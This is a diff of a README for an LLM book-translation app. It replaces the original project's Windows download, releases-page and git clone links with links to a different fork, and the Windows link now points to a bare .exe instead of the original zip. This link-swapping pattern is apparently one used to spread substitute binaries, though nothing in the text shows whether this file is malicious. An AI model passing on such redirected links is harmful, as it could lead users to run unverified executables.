@@ -4,7 +4,7 @@
 
 <div align="center">
 
-[![Download Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://github.com/hydropix/TranslateBooksWithLLMs/releases/latest/download/TranslateBook-Windows.zip) [![Download macOS Intel](https://img.shields.io/badge/Download-macOS%20Intel-black?style=for-the-badge&logo=apple)](https://github.com/hydropix/TranslateBooksWithLLMs/releases/latest/download/TranslateBook-macOS-Intel.zip) [![Download macOS Apple Silicon](https://img.shields.io/badge/Download-macOS%20M1%2FM2%2FM3%2FM4-black?style=for-the-badge&logo=apple)](https://github.com/hydropix/TranslateBooksWithLLMs/releases/latest/download/TranslateBook-macOS-AppleSilicon.zip)
+[![Download Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://github.com/windfox1243/TranslateBooksWithLLMs---RAG-context/releases/latest/download/TranslateBooksWithLLMs.exe) [![Download macOS Intel](https://img.shields.io/badge/Download-macOS%20Intel-black?style=for-the-badge&logo=apple)](https://github.com/hydropix/TranslateBooksWithLLMs/releases/latest/download/TranslateBook-macOS-Intel.zip) [![Download macOS Apple Silicon](https://img.shields.io/badge/Download-macOS%20M1%2FM2%2FM3%2FM4-black?style=for-the-badge&logo=apple)](https://github.com/hydropix/TranslateBooksWithLLMs/releases/latest/download/TranslateBook-macOS-AppleSilicon.zip)
 
 </div>
 
@@ -24,7 +24,7 @@ A desktop app that translates **books**, **subtitles**, and **documents** with A
 
 ## Quick Start
 
-1. **Download** the release for your platform (buttons above), or grab it from the [releases page](https://github.com/hydropix/TranslateBooksWithLLMs/releases/latest).
+1. **Download** the release for your platform (buttons above), or grab it from the [releases page](https://github.com/windfox1243/TranslateBooksWithLLMs---RAG-context/releases/latest).
 2. **Extract** the archive.
 3. **Run** `TranslateBook.exe` (Windows) or `./TranslateBook` (macOS).
 4. **Open** http://localhost:5000 in your browser.
@@ -88,7 +88,7 @@ See [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) for more solutions.
 **Prerequisites:** [Python 3.8+](https://www.python.org/downloads/), [Ollama](https://ollama.com/), [Git](https://git-scm.com/)
 
 ```bash
-git clone https://github.com/hydropix/TranslateBooksWithLLMs.git
+git clone https://github.com/windfox1243/TranslateBooksWithLLMs---RAG-context.git
 cd TranslateBookWithLLM
 ollama pull qwen3:14b    # Download a model
 
